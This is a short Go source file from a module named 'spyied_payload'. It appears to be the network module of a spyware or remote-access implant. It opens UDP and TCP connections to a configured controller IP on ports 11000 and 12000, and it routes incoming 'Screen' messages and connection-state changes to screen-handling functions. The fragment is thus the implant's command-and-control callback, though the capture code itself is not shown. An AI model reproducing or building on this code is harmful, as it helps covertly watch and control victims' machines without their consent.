package activity

import (
	"spyied_payload/helpers/vars"
	"spyied_payload/network"
)

var tcpClient *network.TCPClient

func FireNetworkActivity() {
	network.InitUDPClient(vars.IP, 11000)

	tcpClient = network.NewTCPClient(&network.ConnectionConfig{
		IP:   vars.IP,
		Port: 12000,
	})

	tcpClient.SetHandlers(msgHandler, connStateHandler)
	tcpClient.StartConnecting()
}

func msgHandler(msgType network.MSGType, payload interface{}) {
	switch msgType {
	case network.MSGTypeScreen:
		if screenMsg, ok := payload.(network.ScreenMSG); ok {
			screenMsgHandler(screenMsg)
		}
	}
}

func connStateHandler(isConnected bool) {
	connStateChangedScreen(isConnected)
}
